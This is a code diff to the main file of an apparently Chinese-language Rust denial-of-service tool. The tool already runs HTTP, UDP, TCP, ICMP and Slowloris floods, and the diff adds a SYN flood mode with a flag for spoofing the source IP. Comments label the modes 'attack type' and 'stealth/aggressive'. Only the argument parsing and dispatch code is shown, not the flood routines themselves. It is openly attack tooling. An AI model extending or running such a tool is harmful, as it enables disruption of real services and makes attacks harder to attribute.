@@ -4,6 +4,7 @@ mod udp_flood;
 mod tcp_flood;
 mod icmp_flood;
 mod slowloris;
+mod syn_flood;
 mod interactive;
 mod config;
 
@@ -13,6 +14,7 @@ use udp_flood::{run_udp_flood, UdpFloodConfig};
 use tcp_flood::{run_tcp_flood, TcpFloodConfig};
 use icmp_flood::{run_icmp_flood, IcmpFloodConfig};
 use slowloris::{run_slowloris, SlowlorisConfig};
+use syn_flood::{run_syn_flood, SynFloodConfig};
 use interactive::start_interactive_mode;
 use config::AppConfig;
 
@@ -46,7 +48,7 @@ struct Args {
     /// 攻击模式 (normal/stealth/aggressive)
     #[arg(short, long)]
     mode: Option<String>,
-    /// 攻击类型 (http/udp/tcp/icmp/slowloris)
+    /// 攻击类型 (http/udp/tcp/icmp/slowloris/syn)
     #[arg(short, long, default_value = "http")]
     attack_type: String,
     /// 数据包大小
@@ -85,6 +87,9 @@ struct Args {
     /// 最大间隔 (Slowloris)
     #[arg(long, default_value_t = 50)]
     max_interval: u64,
+    /// 伪造源IP (SYN)
+    #[arg(long)]
+    spoof_ip: bool,
     /// 交互模式
     #[arg(short, long)]
     interactive: bool,
@@ -114,6 +119,7 @@ async fn main() {
                 "tcp" => config.default_tcp_connections,
                 "icmp" => config.default_icmp_connections,
                 "slowloris" => config.default_slowloris_connections,
+                "syn" => config.default_syn_connections,
                 _ => config.default_http_connections,
             }
         });
@@ -190,9 +196,21 @@ async fn main() {
                 };
                 run_slowloris(config).await;
             }
+            "syn" => {
+                let config = SynFloodConfig {
+                    target,
+                    port: args.port,
+                    connections,
+                    duration,
+                    packet_size,
+                    mode,
+                    spoof_ip: args.spoof_ip,
+                };
+                run_syn_flood(config).await;
+            }
             _ => {
                 eprintln!("❌ 不支持的攻击类型: {}", args.attack_type);
-                eprintln!("支持的类型: http, udp, tcp, icmp, slowloris");
+                eprintln!("支持的类型: http, udp, tcp, icmp, slowloris, syn");
             }
         }
     } else {
